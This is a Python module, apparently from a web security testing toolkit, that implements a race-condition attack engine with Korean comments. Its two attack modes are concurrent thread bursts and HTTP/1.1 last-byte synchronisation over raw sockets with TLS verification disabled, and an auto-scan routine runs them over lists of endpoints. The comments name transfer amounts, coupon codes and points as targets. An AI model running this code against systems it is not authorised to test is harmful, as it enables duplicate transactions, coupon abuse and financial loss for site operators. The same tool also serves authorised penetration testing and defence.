"""bingo/tools/race_condition.py — 레이스 컨디션 엔진 (단일패킷/스레드) v2.6.0"""
from __future__ import annotations

import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class RaceFinding:
    endpoint: str
    method: str
    technique: str          # "single_packet" | "thread_burst" | "last_byte_sync"
    total_requests: int
    unique_statuses: dict
    anomaly: str
    confirmed: bool
    severity: str = "HIGH"
    notes: str = ""


@dataclass
class RaceReport:
    target: str
    findings: list[RaceFinding] = field(default_factory=list)

    @property
    def vulnerable(self) -> list[RaceFinding]:
        return [f for f in self.findings if f.confirmed]


class RaceConditionEngine:
    """레이스 컨디션 취약점 탐지 — 스레드 버스트 + 응답 다양성 분석"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        base_url: str,
        headers: dict | None = None,
    ) -> None:
        self.req = request_fn
        self.base = base_url.rstrip("/")
        self.headers = headers or {}

    # ── 스레드 버스트 공격 ─────────────────────────────────────────────────────
    def thread_burst(
        self,
        url: str,
        method: str = "POST",
        body: str = "",
        concurrency: int = 20,
        rounds: int = 3,
    ) -> RaceFinding:
        """동시 요청으로 중복 처리 유도"""
        all_statuses: list[int] = []
        all_bodies: list[str] = []
        lock = threading.Lock()

        def send():
            try:
                status, resp = self.req(url, method, self.headers, body)
                with lock:
                    all_statuses.append(status)
                    all_bodies.append(resp[:100])
            except Exception:
                with lock:
                    all_statuses.append(0)

        for _ in range(rounds):
            threads = [threading.Thread(target=send) for _ in range(concurrency)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=10)
            time.sleep(0.1)

        status_counter = Counter(all_statuses)
        unique_statuses = dict(status_counter)

        # 레이스 컨디션 신호: 동일 요청에 다른 상태코드 (200 + 409/429 등)
        confirmed = len(unique_statuses) > 1 and (
            200 in unique_statuses and any(s in unique_statuses for s in (201, 409, 429, 500))
        )

        # 응답 본문 다양성 (이체 금액, 쿠폰코드, 포인트 등 변화)
        unique_body_count = len(set(all_bodies))
        anomaly = f"Status variation: {unique_statuses}"
        if unique_body_count > concurrency // 2:
            confirmed = True
            anomaly += f" | Body variation: {unique_body_count}/{len(all_bodies)} unique"

        return RaceFinding(
            endpoint=url, method=method,
            technique="thread_burst",
            total_requests=len(all_statuses),
            unique_statuses=unique_statuses,
            anomaly=anomaly,
            confirmed=confirmed,
            notes=f"Concurrency: {concurrency}x{rounds} rounds",
        )

    # ── 마지막 바이트 동기화 ───────────────────────────────────────────────────
    def last_byte_sync(
        self,
        url: str,
        method: str = "POST",
        body: str = "",
        workers: int = 10,
    ) -> RaceFinding:
        """마지막 바이트를 동시에 전송하여 서버 처리 동기화"""
        import socket
        import ssl

        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path + (f"?{parsed.query}" if parsed.query else "")

        body_bytes = body.encode()
        hdrs = "\r\n".join(f"{k}: {v}" for k, v in {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body_bytes)),
            **self.headers,
        }.items())
        # 헤더 + 바디 첫 N-1 바이트
        partial = f"{method} {path} HTTP/1.1\r\n{hdrs}\r\n\r\n".encode()
        if body_bytes:
            partial += body_bytes[:-1]   # 마지막 1바이트 제외
        last_byte = body_bytes[-1:] if body_bytes else b"\r\n"

        sockets: list = []
        # Phase 1: 모든 소켓 연결 + 부분 전송
        for _ in range(workers):
            try:
                sock = socket.create_connection((host, port), timeout=5)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(partial)
                sockets.append(sock)
            except Exception:
                pass

        time.sleep(0.05)  # 동기화 대기

        # Phase 2: 마지막 바이트 동시 전송
        statuses: list[int] = []
        for sock in sockets:
            try:
                sock.sendall(last_byte)
            except Exception:
                pass

        for sock in sockets:
            try:
                resp = b""
                sock.settimeout(3)
                try:
                    while True:
                        chunk = sock.recv(1024)
                        if not chunk:
                            break
                        resp += chunk
                except Exception:
                    pass
                r = resp.decode("utf-8", errors="replace")
                status = int(r.split(" ")[1]) if r.startswith("HTTP/") else 0
                statuses.append(status)
                sock.close()
            except Exception:
                statuses.append(0)

        status_counter = Counter(statuses)
        confirmed = len(set(s for s in statuses if s > 0)) > 1

        return RaceFinding(
            endpoint=url, method=method,
            technique="last_byte_sync",
            total_requests=len(statuses),
            unique_statuses=dict(status_counter),
            anomaly=f"Last-byte sync {workers} workers: {dict(status_counter)}",
            confirmed=confirmed,
            notes="HTTP/1.1 last-byte synchronization attack",
        )

    # ── 자동 스캔 ─────────────────────────────────────────────────────────────
    def auto_scan(
        self,
        endpoints: list[tuple[str, str, str]],  # (url, method, body)
    ) -> RaceReport:
        report = RaceReport(target=self.base)
        for url, method, body in endpoints:
            finding = self.thread_burst(url, method, body)
            if finding.confirmed:
                report.findings.append(finding)
            else:
                # 좀 더 정밀한 테스트
                finding2 = self.last_byte_sync(url, method, body)
                if finding2.confirmed:
                    report.findings.append(finding2)
        return report
